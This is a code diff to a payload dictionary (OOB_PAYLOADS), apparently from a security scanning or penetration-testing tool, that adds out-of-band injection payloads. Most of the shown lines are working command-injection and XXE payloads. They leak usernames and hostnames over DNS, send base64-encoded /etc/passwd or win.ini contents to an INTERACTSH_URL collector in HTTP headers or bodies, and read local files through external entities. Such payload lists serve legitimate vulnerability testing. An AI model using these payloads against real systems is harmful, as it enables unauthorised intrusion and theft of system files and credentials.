@@ -183,6 +183,7 @@ OOB_PAYLOADS = {
     "dns": [
         "nslookup `whoami`.INTERACTSH_URL",
         "dig `whoami`.INTERACTSH_URL",
+        "dig +short `whoami`.`hostname`.INTERACTSH_URL", # Multi-Level DNS
         "host `whoami`.INTERACTSH_URL",
         "ping -c 1 `whoami`.INTERACTSH_URL",
         "curl -v `whoami`.INTERACTSH_URL",
@@ -190,16 +191,19 @@ OOB_PAYLOADS = {
         "python -c 'import socket; socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
         "perl -e 'use Socket; gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
         "ruby -e 'require \"socket\"; Socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
+        "php -r 'dns_get_record(\"`whoami`.INTERACTSH_URL\",DNS_A);'", # PHP DNS Lookup
         "php -r 'gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
     ],
     "http": [
         "curl http://INTERACTSH_URL/`whoami`",
+        "curl -H \"X-Data: $(base64 /etc/passwd)\" http://INTERACTSH_URL/", # Header Exfil
         "wget -q -O- http://INTERACTSH_URL/`whoami`",
         "python -c 'import urllib.request; urllib.request.urlopen(\"http://INTERACTSH_URL/`whoami`\")'",
         "perl -e 'use LWP::Simple; get(\"http://INTERACTSH_URL/`whoami`\");'",
         "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"http://INTERACTSH_URL/`whoami`\"))'",
         "php -r 'file_get_contents(\"http://INTERACTSH_URL/`whoami`\");'",
         "powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"",
+        "powershell -c \"IWR -Uri http://INTERACTSH_URL/ -Body ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((gc 'C:\\Windows\\win.ini' -Raw))))\"", # PowerShell UTF8 Exfil
         "certutil -urlcache -split -f http://INTERACTSH_URL/`whoami`",
     ],
     "https": [
@@ -254,6 +258,7 @@ OOB_PAYLOADS = {
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % p SYSTEM \"http://INTERACTSH_URL/\"><!ENTITY % q \"<!ENTITY r '%p;'>\">%q;]><x>&r;</x>", # Nested Entity OOB
     ],
     "ssrf": [
         "http://INTERACTSH_URL/",
